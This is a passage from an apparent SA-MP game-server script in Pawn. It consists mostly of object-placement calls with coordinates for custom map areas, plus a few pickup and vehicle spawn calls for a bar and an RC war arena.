	CreateSObject(2780, -2589.899170, -1645.894653, 343.631775, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2594.011963, -1646.460693, 340.520874, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2591.142578, -1632.271484, 341.621307, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2588.195068, -1638.563477, 343.285797, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2591.188721, -1636.743408, 340.622681, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2586.416748, -1641.366699, 345.786743, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2594.579102, -1637.298462, 339.498413, 0.0000, 0.0000, 0.0000);
	CreateSObject(3437, -2577.179688, -1619.834717, 351.419708, 0.0000, 81.6464, 281.1727);
	CreateSObject(3437, -2575.360352, -1628.574829, 352.720764, 0.0000, 81.6464, 282.0321);
	CreateSObject(3437, -2571.044189, -1633.766357, 357.141022, 0.0000, 109.1483, 272.5783);
	CreateSObject(3437, -2575.007568, -1635.286255, 351.657715, 0.0000, 53.2850, 307.9699);
	CreateSObject(1245, -2587.218018, -1666.269165, 352.529236, 0.0000, 0.0000, 76.0169);
	CreateSObject(1225, -2586.379639, -1668.118408, 354.341187, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2584.987793, -1660.238403, 348.598724, 0.0000, 0.0000, 0.0000);
	CreateSObject(1503, -2583.664795, -1697.549072, 351.085022, 0.0000, 0.0000, 180.0000);
	CreateSObject(1660, -2583.074707, -1731.562622, 348.326691, 0.0000, 0.0000, 6.9528);
	CreateSObject(2931, -2570.190186, -1768.023071, 355.836456, 24.0642, 357.4217, 209.4528);
	CreateSObject(5152, -2559.346191, -1786.955933, 365.945313, 359.1406, 333.3575, 300.3123);
	CreateSObject(1225, -2539.912354, -1792.772827, 372.951691, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2535.408203, -1796.038086, 374.235748, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2546.846924, -1792.511841, 370.759064, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2537.529297, -1785.448120, 376.487762, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2533.206787, -1790.888306, 375.521973, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2543.089844, -1793.318970, 368.719055, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2537.776367, -1785.554077, 375.469421, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2548.171143, -1791.620850, 369.045288, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2534.297852, -1791.592407, 372.474030, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2539.473389, -1794.069580, 370.069092, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2536.993896, -1795.939453, 370.586151, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2541.771973, -1787.546387, 371.250183, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2531.218506, -1795.886719, 372.929352, 0.0000, 0.0000, 0.0000);
	CreateSObject(3437, -2515.258057, -1799.518066, 381.787231, 0.0000, 90.2408, 269.9227);
	CreateSObject(3437, -2515.184326, -1793.114502, 385.510925, 0.0000, 65.3171, 280.2359);
	CreateSObject(3437, -2518.326904, -1793.658813, 379.514587, 0.0000, 114.3050, 269.0632);
	CreateSObject(3437, -2515.497803, -1806.503174, 381.712494, 0.0000, 90.2408, 269.9227);
	CreateSObject(1225, -2547.628418, -1673.666016, 398.522827, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2552.944580, -1681.347412, 396.136292, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2556.356934, -1691.165649, 393.948853, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2543.882324, -1704.780029, 396.268829, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2543.163330, -1687.879517, 398.343842, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2549.695068, -1694.847656, 395.227722, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2539.429932, -1695.667480, 398.964905, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2558.038330, -1698.527588, 391.959229, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2532.707275, -1712.260010, 400.633270, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2544.283691, -1677.497681, 399.819458, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2557.850098, -1707.443726, 390.445862, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2549.099365, -1667.039673, 399.146759, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2558.086914, -1707.370239, 389.384430, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2558.397949, -1698.679688, 390.464264, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2556.766113, -1691.156372, 392.039703, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2553.285645, -1681.493164, 392.697083, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2547.875732, -1673.755371, 394.223663, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2549.444824, -1667.235107, 398.112213, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2544.556396, -1677.492065, 396.511902, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2544.236084, -1704.723877, 392.606171, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2549.932861, -1694.730225, 391.602905, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2539.759277, -1695.656494, 395.320557, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2532.794678, -1711.807739, 396.135895, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2543.414307, -1687.892944, 394.279327, 0.0000, 0.0000, 0.0000);
	CreateSObject(1245, -2532.418213, -1701.918945, 401.564972, 0.0000, 0.0000, 101.2500);
	CreateSObject(1245, -2523.267822, -1728.932129, 402.089783, 0.0000, 0.0000, 107.2660);
	CreateSObject(1245, -2497.930420, -1772.822021, 402.682434, 0.0000, 0.0000, 139.0653);
	CreateSObject(1245, -2464.544922, -1805.090698, 406.440247, 0.0000, 0.0000, 139.0653);
	CreateSObject(1245, -2449.632568, -1761.370972, 419.954498, 0.0000, 0.0000, 296.5654);
	CreateSObject(1245, -2450.215576, -1720.308350, 431.115570, 0.0000, 0.0000, 206.5654);
	CreateSObject(1245, -2426.648438, -1740.896973, 433.683197, 0.0000, 0.0000, 105.3154);
	CreateSObject(1245, -2371.126709, -1810.986816, 431.271973, 0.0000, 0.0000, 161.5655);
	CreateSObject(1245, -2330.576172, -1813.933350, 435.210846, 0.0000, 0.0000, 190.7865);
	CreateSObject(1245, -2326.254639, -1813.291382, 437.849335, 0.0000, 0.0000, 190.7865);
	CreateSObject(2780, -2401.448730, -1780.995972, 427.723480, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2446.988037, -1740.212769, 424.612579, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2446.819824, -1727.938965, 427.378204, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2434.279785, -1736.005005, 429.167908, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2455.009277, -1731.025635, 424.968353, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2454.730225, -1720.072754, 427.198151, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2349.083252, -1814.824341, 428.958099, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2333.201416, -1812.225708, 430.211823, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2279.680420, -1726.865601, 468.453400, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2286.302979, -1700.914795, 474.099365, 0.0000, 0.0000, 0.0000);
	CreateSObject(655, -2235.619141, -1742.373901, 479.662231, 0.0000, 0.0000, 315.0000);
	CreateSObject(3437, -2380.811279, -1651.898560, 491.536316, 34.3775, 5.1566, 277.8123);
	CreateSObject(3437, -2383.045654, -1647.589111, 494.260559, 110.8672, 338.5141, 190.2361);
	CreateSObject(3437, -2379.523682, -1646.964111, 489.456757, 57.5822, 10.3132, 189.3767);
	CreateSObject(3437, -2383.670654, -1616.548706, 497.108459, 140.9477, 296.4017, 188.5172);
	CreateSObject(3437, -2382.355957, -1611.172241, 497.920105, 183.9199, 298.9801, 143.5945);
	CreateSObject(3437, -2383.211914, -1620.532349, 496.817596, 61.0199, 349.6868, 277.8123);
	CreateSObject(3437, -2380.375977, -1607.985229, 498.854828, 64.4577, 350.5462, 276.9529);
	CreateSObject(14608, -2356.057617, -1634.861694, 484.324310, 0.0000, 0.0000, 225.0000);
	CreateSObject(13562, -2378.820801, -1587.524170, 501.033417, 0.0000, 0.0000, 0.0000);
	CreateSObject(8491, -2436.717529, -1619.277222, 530.907593, 0.0000, 0.0000, 303.7500);
	CreateSObject(8483, -2308.400635, -1589.760376, 486.097137, 358.2811, 342.8113, 225.0000);
	CreateSObject(7392, -2261.576904, -1735.964966, 494.348572, 0.0000, 0.0000, 281.2500);
	CreateSObject(3515, -2308.621338, -1691.863403, 481.669830, 0.0000, 0.0000, 0.0000);
	CreateSObject(3515, -2322.228271, -1681.082642, 482.201843, 0.0000, 0.0000, 0.0000);
	CreateSObject(3515, -2332.864502, -1670.540527, 483.200684, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, -2313.972900, -1687.520386, 483.884308, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, -2327.551270, -1674.177856, 485.072784, 0.0000, 0.0000, 0.0000);
	CreateSObject(3472, -2362.193359, -1580.887329, 490.066040, 357.4217, 45.5501, 329.0603);
	CreateSObject(14582, -2290.838867, -1624.935669, 486.189423, 0.0000, 0.0000, 0.0000);
	CreateSObject(7617, -2346.225586, -1727.160645, 494.147888, 0.0000, 0.0000, 168.7500);
	CreateSObject(14781, -2334.358398, -1581.307861, 483.650513, 0.0000, 0.0000, 270.0000);
	CreateSObject(1985, -2333.766113, -1581.604248, 486.832886, 0.0000, 0.0000, 0.0000);
	// 0.4.5 - Las Venturas Objects (SaMaRa):
	CreateSObject(1606, 2010.802979, 1563.743652, 6.885682, 0.0000, 0.0000, 225.0000);
	CreateSObject(1605, 2006.556396, 1525.639160, 7.176254, 0.0000, 0.0000, 337.5000);
	CreateSObject(1607, 2007.689941, 1536.444092, 9.127992, 36.0963, 0.0000, 292.5000);
	CreateSObject(1607, 2009.868408, 1554.516968, 8.377992, 36.0963, 0.0000, 241.3294);
	CreateSObject(1599, 2011.127686, 1580.964478, 7.137766, 0.0000, 0.0000, 315.0000);
	CreateSObject(1609, 2019.679565, 1533.095459, 10.146799, 0.0000, 0.0000, 292.5000);
	CreateSObject(6300, 1989.678711, 1686.327026, 0.920842, 0.0000, 0.0000, 90.0000);
	CreateSObject(6300, 1997.790527, 1661.189819, 0.899890, 0.0000, 0.0000, 0.0000);
	CreateSObject(14582, 2018.446899, 1690.970825, 12.459661, 0.0000, 0.0000, 101.2500);
	CreateSObject(16152, 2027.380859, 1676.789185, 8.721349, 0.0000, 0.0000, 180.0000);
	CreateSObject(16152, 2027.373535, 1667.486816, 8.721349, 0.0000, 0.0000, 180.0000);
	CreateSObject(1281, 2021.928345, 1635.359375, 9.750913, 0.0000, 0.0000, 180.0000);
	CreateSObject(1281, 2022.412964, 1645.781738, 9.750913, 0.0000, 0.0000, 180.0000);
	CreateSObject(1281, 2007.758545, 1635.281738, 9.750912, 0.0000, 0.0000, 180.0000);
	CreateSObject(1281, 2008.751465, 1646.035767, 9.750912, 0.0000, 0.0000, 180.0000);
	CreateSObject(1723, 2024.489136, 1697.105835, 8.973577, 0.0000, 0.0000, 0.0000);
	CreateSObject(1723, 2021.469238, 1697.129395, 8.973577, 0.0000, 0.0000, 0.0000);
	CreateSObject(1723, 2027.710083, 1695.736084, 8.973577, 0.0000, 0.0000, 270.0000);
	CreateSObject(1723, 2027.708496, 1692.953003, 8.948577, 0.0000, 0.0000, 270.0000);
	CreateSObject(9833, 1942.997559, 1687.189941, 1.365583, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, 1913.107788, 1687.292725, 2.244331, 0.0000, 0.0000, 0.0000);
	CreateSObject(6965, 1932.993408, 1690.730957, 8.817440, 0.0000, 0.0000, 0.0000);
	CreateSObject(3472, 2015.875610, 1640.523315, 9.219691, 0.0000, 0.0000, 11.2500);
	CreateSObject(1607, 1945.856567, 1682.386230, 8.530986, 21.4859, 0.0000, 292.5000);
	CreateSObject(1607, 1947.112793, 1693.755859, 8.529473, 44.6907, 0.0000, 270.0000);
	CreateSObject(1606, 1904.022461, 1685.994019, 7.459967, 0.0000, 0.0000, 78.7500);
	CreateSObject(1605, 1924.157715, 1686.791626, 7.626705, 0.0000, 0.0000, 45.0000);
	CreateSObject(3440, 1983.970581, 1650.780518, 13.343687, 0.0000, 0.0000, 78.7500);
	CreateSObject(14877, 1987.112793, 1644.650391, 9.144314, 0.0000, 0.0000, 112.5000);
	CreateSObject(14877, 1975.195557, 1635.050781, 9.119326, 0.0000, 0.0000, 146.2500);
	CreateSObject(10009, 1972.046753, 1640.704956, 18.509418, 0.0000, 0.0000, 141.0933);
	CreateSObject(14407, 1968.958252, 1645.244019, 12.734810, 0.0000, 0.0000, 146.2500);
	CreateSObject(1828, 1983.768555, 1650.510986, 11.269677, 0.0000, 0.0000, 225.0000);
	CreateSObject(14391, 1996.755859, 1669.510132, 22.608524, 0.0000, 0.0000, 180.0000);
	CreateSObject(1809, 1995.748047, 1665.871704, 21.769218, 0.0000, 0.0000, 270.0000);
	CreateSObject(1841, 1996.427856, 1673.034790, 21.771252, 0.0000, 0.0000, 348.7500);
	CreateSObject(2104, 1996.993408, 1673.891724, 21.770716, 0.0000, 0.0000, 315.0000);
	CreateSObject(1841, 1991.573242, 1659.919800, 21.765732, 0.0000, 0.0000, 281.2500);
	CreateSObject(1841, 1987.389038, 1680.000854, 21.771252, 0.0000, 0.0000, 101.2501);
	CreateSObject(2780, 1988.472534, 1670.419312, 19.523438, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1989.166870, 1679.784790, 22.137125, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1996.232910, 1676.556274, 22.212124, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1999.493042, 1669.514648, 22.187124, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1996.827393, 1662.217163, 22.156603, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1992.250977, 1659.953613, 22.081604, 0.0000, 0.0000, 0.0000);
	CreateSObject(14877, 1911.840454, 1652.665649, 22.318735, 0.0000, 0.0000, 90.0000);
	CreateSObject(2627, 1896.315918, 1661.300781, 24.407066, 0.0000, 0.0000, 90.0000);
	CreateSObject(2628, 1910.145874, 1670.486572, 24.395412, 0.0000, 0.0000, 0.0000);
	CreateSObject(2630, 1924.037964, 1655.816528, 24.400925, 0.0000, 0.0000, 0.0000);
	CreateSObject(2630, 1921.298218, 1655.782349, 24.425924, 0.0000, 0.0000, 0.0000);
	CreateSObject(2632, 1910.203735, 1669.833130, 24.390968, 0.0000, 0.0000, 270.0000);
	CreateSObject(2628, 1912.892456, 1670.257813, 24.395412, 0.0000, 0.0000, 0.0000);
	CreateSObject(2627, 1896.135132, 1665.283447, 24.382067, 0.0000, 0.0000, 90.0000);
	CreateSObject(2632, 1912.822021, 1669.802856, 24.372696, 0.0000, 0.0000, 270.0000);
	CreateSObject(2631, 1896.831421, 1661.256348, 24.481337, 0.0000, 0.0000, 0.0000);
	CreateSObject(2631, 1896.810303, 1665.354248, 24.452578, 0.0000, 0.0000, 0.0000);
	CreateSObject(2632, 1924.170776, 1656.589966, 24.372700, 0.0000, 0.0000, 270.0000);
	CreateSObject(2631, 1921.279419, 1656.500854, 24.402578, 0.0000, 0.0000, 90.0000);
	CreateSObject(3554, 2196.452881, 1990.294800, 25.959511, 0.0000, 0.0000, 270.0000);
	CreateSObject(8618, 2171.291992, 2011.345703, 22.826216, 0.0000, 0.0000, 0.0000);
	CreateSObject(2745, 1926.995972, 1654.081299, 22.983583, 0.0000, 0.0000, 0.0000);
	CreateSObject(2745, 1895.215698, 1654.066772, 22.983583, 0.0000, 0.0000, 0.0000);
	CreateSObject(1609, 2095.748291, 1882.510620, 13.380779, 0.0000, 0.0000, 268.3585);
	CreateSObject(1609, 2079.875977, 1938.830200, 12.391325, 0.0000, 0.0000, 268.3585);
	CreateSObject(1609, 2105.726563, 1878.354858, 9.721905, 12.8916, 0.0000, 268.3585);
	CreateSObject(1609, 2098.026611, 1910.254272, 9.531213, 22.3454, 0.0000, 281.2500);
	CreateSObject(1609, 2106.193359, 1957.065063, 9.554530, 36.0963, 0.0000, 281.2500);
	CreateSObject(1371, 2027.678223, 1696.842773, 9.831289, 0.0000, 0.0000, 306.3283);
	CreateSObject(1608, 1987.387573, 1563.757935, 7.605780, 0.0000, 0.0000, 236.2501);
	CreateSObject(1608, 1987.850342, 1555.187622, 7.705779, 0.0000, 0.0000, 306.1737);
	CreateSObject(3438, 1959.107300, 1529.704224, 16.177481, 0.0000, 0.0000, 90.0000);
	CreateSObject(1607, 1960.886719, 1521.598145, 10.352992, 20.6265, 0.0000, 11.2500);
	CreateSObject(1607, 1959.492188, 1529.316650, 16.023256, 0.0000, 0.0000, 11.2500);
	CreateSObject(1607, 1958.795044, 1539.956665, 11.127992, 311.8716, 0.0000, 10.3132);
	CreateSObject(1645, 1984.472656, 1630.603760, 9.286725, 0.0000, 0.0000, 176.5622);
	CreateSObject(1646, 1993.112915, 1630.507813, 9.112962, 0.0000, 0.0000, 180.0000);
	CreateSObject(1647, 1990.102173, 1630.468872, 8.992188, 0.0000, 0.0000, 0.0000);
	CreateSObject(1646, 1987.522705, 1630.553467, 9.287959, 0.0000, 0.0000, 180.0000);
	CreateSObject(1643, 1991.563354, 1630.459106, 8.974522, 0.0000, 0.0000, 0.0000);
	CreateSObject(1641, 1988.716064, 1630.481934, 8.974522, 0.0000, 0.0000, 180.0000);
	CreateSObject(1640, 1985.860352, 1630.705811, 8.974522, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, 2126.145996, 1317.403076, 3.459497, 0.0000, 0.0000, 33.7500);
	CreateSObject(9833, 2126.297852, 1305.544678, 2.993476, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, 2127.010010, 1292.204712, 3.158659, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, 2127.627930, 1277.254639, 3.176023, 0.0000, 0.0000, 0.0000);
	CreateSObject(9833, 2126.788574, 1262.205444, 3.087988, 0.0000, 0.0000, 0.0000);
	CreateSObject(9831, 2156.407715, 1285.659180, 4.884408, 315.3093, 0.0000, 90.9369);
	CreateSObject(990, 2113.845459, 1342.932129, 12.483570, 0.0000, 0.0000, 0.0000);
	CreateSObject(990, 2123.833252, 1342.934692, 12.468740, 0.0000, 0.0000, 0.0000);
	CreateSObject(992, 2130.229736, 1342.948975, 12.479018, 0.0000, 0.0000, 0.0000);
	CreateSObject(992, 2131.490723, 1341.495117, 12.504018, 0.0000, 0.0000, 270.0000);
	CreateSObject(992, 2131.514648, 1339.881958, 12.504018, 0.0000, 0.0000, 270.0000);
	CreateSObject(990, 2113.754150, 1323.571045, 12.433571, 0.0000, 0.0000, 180.0000);
	CreateSObject(990, 2123.760010, 1323.559082, 12.437609, 0.0000, 0.0000, 180.0000);
	CreateSObject(992, 2130.294922, 1323.612915, 12.454019, 0.0000, 0.0000, 180.0000);
	CreateSObject(992, 2131.621338, 1325.077026, 12.454019, 0.0000, 0.0000, 270.0000);
	CreateSObject(992, 2131.624268, 1326.619385, 12.454019, 0.0000, 0.0000, 270.0000);
	CreateSObject(623, 2136.357666, 1338.239502, 9.619685, 0.0000, 0.0000, 168.7499);
	CreateSObject(622, 2145.049561, 1335.952393, 9.479996, 0.0000, 0.0000, 168.7499);
	CreateSObject(623, 2152.539307, 1330.367188, 9.643204, 0.0000, 0.0000, 168.7499);
	CreateSObject(622, 2163.133545, 1324.170410, 9.587009, 0.0000, 0.0000, 157.5000);
	CreateSObject(3463, 2111.993652, 1285.654907, 10.189472, 0.0000, 0.0000, 270.0000);
	CreateSObject(14565, 2119.622314, 1324.069580, 11.325172, 0.0000, 0.0000, 270.0000);
	CreateSObject(16151, 2118.795410, 1324.906982, 10.212066, 0.0000, 0.0000, 270.0000);
	CreateSObject(16152, 2112.311279, 1341.616577, 9.816128, 0.0000, 0.0000, 270.0000);
	CreateSObject(16152, 2121.631104, 1341.633057, 9.816128, 0.0000, 0.0000, 270.0000);
	CreateSObject(955, 2130.860596, 1341.268066, 10.235909, 0.0000, 0.0000, 270.0000);
	CreateSObject(956, 2130.933350, 1340.057495, 10.233835, 0.0000, 0.0000, 270.0000);
	CreateSObject(1256, 2143.274170, 1331.026367, 10.479769, 0.0000, 0.0000, 63.1255);
	CreateSObject(1256, 2159.092285, 1322.004028, 10.479769, 0.0000, 0.0000, 56.2500);
	CreateSObject(1432, 2129.987305, 1326.776489, 9.925884, 0.0000, 0.0000, 337.5000);
	CreateSObject(1256, 2111.905273, 1289.083618, 10.479769, 0.0000, 0.0000, 180.0000);
	CreateSObject(1256, 2111.886230, 1282.440186, 10.447299, 0.0000, 0.0000, 180.0000);
	CreateSObject(649, 2111.411133, 1278.677612, 9.885843, 0.0000, 0.0000, 0.0000);
	CreateSObject(649, 2111.341309, 1292.084717, 9.893314, 0.0000, 0.0000, 0.0000);
	CreateSObject(3471, 2026.432861, 1331.595825, 11.094852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3471, 2026.418091, 1337.622070, 11.094852, 0.0000, 0.0000, 0.0000);
	CreateSObject(3471, 2026.405396, 1348.501709, 11.087519, 0.0000, 0.0000, 0.0000);
	CreateSObject(3471, 2026.413818, 1354.395996, 11.094852, 0.0000, 0.0000, 0.0000);
	CreateSObject(1597, 2011.560059, 1357.888794, 12.477695, 0.0000, 0.0000, 0.0000);
	CreateSObject(1597, 2011.509155, 1328.572632, 12.477695, 0.0000, 0.0000, 0.0000);
	CreateSObject(3802, 2018.836426, 1343.017700, 13.986699, 0.0000, 0.0000, 0.0000);
	// 0.4.5 - Race Objects (SaMaRa):
	CreateSObject(16776, 2072.317383, 808.620728, 7.261456, 0.0000, 353.1245, 270.0000);
	CreateSObject(16776, 2044.929199, 808.417908, 7.008038, 0.0000, 8.5944, 92.6556);
	CreateSObject(18249, 2058.066406, 808.820129, 4.376092, 0.0000, 0.0000, 270.0000);
	CreateSObject(3513, 2059.655762, 868.812500, 10.151463, 0.0000, 0.0000, 0.0000);
	CreateSObject(18284, 2023.787598, 851.918945, 8.679214, 0.0000, 0.0000, 0.0000);
	CreateSObject(18284, 2023.739380, 833.964600, 8.679214, 0.0000, 0.0000, 0.0000);
	CreateSObject(3463, 2023.634155, 843.128479, 10.951515, 0.0000, 0.0000, 270.0000);
	CreateSObject(623, 1996.253662, 865.266113, 5.742107, 0.0000, 0.0000, 191.2500);
	CreateSObject(623, 1996.915039, 822.395203, 5.919854, 0.0000, 0.0000, 0.0001);
	CreateSObject(623, 1953.795898, 822.058960, 5.407178, 0.0000, 356.5623, 0.0001);
	CreateSObject(623, 1954.567139, 864.608276, 5.071119, 0.0000, 355.7028, 180.0001);
	CreateSObject(623, 1893.788574, 864.949036, 5.535104, 0.0000, 355.7028, 181.7190);
	CreateSObject(623, 1822.606567, 863.232178, 9.393660, 0.0000, 355.7028, 180.0001);
	CreateSObject(623, 1893.995972, 822.238525, 6.858908, 0.0000, 355.7028, 11.2501);
	CreateSObject(623, 1824.062378, 821.955566, 8.901255, 0.0000, 355.7028, 11.2501);
	CreateSObject(8644, 2088.711426, 1164.148071, 15.845644, 0.0000, 0.0000, 0.0000);
	// Gilad Shalit (CrazySex):
	CreateSObject(3374, 1055.063843, 1300.857544, 20.873079, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.073120, 1300.860229, 23.873079, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.061157, 1300.869019, 26.873079, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.043823, 1300.853882, 29.873079, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.031372, 1298.852783, 30.798044, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.043579, 1294.835938, 30.787626, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.000488, 1293.570068, 30.763987, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.077759, 1294.011108, 20.848087, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.008911, 1295.533813, 23.448093, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.018066, 1297.224731, 25.398109, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.105103, 1282.205566, 30.837496, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.109253, 1282.220215, 28.608984, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.034180, 1285.730103, 28.593771, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.063599, 1288.046631, 28.618874, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.091553, 1288.041260, 26.606569, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.119507, 1288.031250, 23.677858, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.172485, 1288.021362, 20.894447, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.070679, 1276.118286, 30.809021, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.098633, 1276.104370, 27.820889, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.092041, 1276.078979, 24.845888, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.106079, 1274.139160, 22.527559, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.128784, 1270.197632, 21.636156, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.156616, 1268.356201, 20.552572, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.068481, 1272.235596, 26.774342, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.029907, 1270.669434, 28.454895, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.056519, 1269.382446, 30.404911, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.937012, 1262.567261, 30.768438, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.918213, 1258.974121, 30.772350, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.914063, 1254.980591, 30.778780, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.903076, 1252.616821, 30.779078, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.967041, 1260.182983, 28.039942, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.919922, 1260.186646, 25.156221, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.949341, 1260.173950, 22.356264, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.977295, 1260.180054, 19.998165, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.016724, 1234.868286, 20.873079, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.017090, 1234.880493, 23.873079, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.006958, 1234.883911, 26.873079, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.013672, 1234.880127, 29.873079, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.016602, 1234.844482, 30.892054, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.040527, 1238.765381, 30.934660, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.028931, 1242.317505, 30.913445, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.111694, 1242.332642, 22.798077, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.057739, 1242.323486, 25.773092, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.037231, 1242.315918, 28.723082, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1055.076050, 1242.340454, 20.873079, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.939087, 1228.617310, 30.848064, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, 1054.985229, 1228.601563, 27.948067, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, 1054.821045, 1250.680664, 24.754129, 0.0000, 89.3814, 269.8633);
	CreateSObject(3461, 1054.763794, 1250.694336, 24.763308, 0.0000, 89.3814, 89.4851);
	// 0.4.6 - Bar:
	CreatePickupEx(338,2,510.0620,-83.3582,998.9609); // snoker
	CreatePickupEx(338,2,506.3500,-83.2475,998.9609); // snoker
	CreatePickupEx(336,2,490.8896,-80.8076,998.7578); // bat
	// 0.4.6 - RC War:
	CreateVehicleEx(464,-973.4568,1060.9358,1344.9771,92.1607,14,75,respawntime,10,world_dm_rc); // dmz_miniplane
	CreateVehicleEx(464,-1031.5508,1020.6958,1341.9498,4.9858,14,75,respawntime,10,world_dm_rc); // dmz_miniplane
	CreateVehicleEx(464,-1024.7292,1098.2567,1341.8744,174.2876,14,75,respawntime,10,world_dm_rc); // dmz_miniplane
	CreateVehicleEx(464,-1132.1190,1028.5123,1345.0278,275.1650,14,75,respawntime,10,world_dm_rc); // dmz_miniplane
	CreateVehicleEx(464,-975.8049,1089.8531,1344.2683,87.3327,14,75,respawntime,10,world_dm_rc); // dmz_miniplane
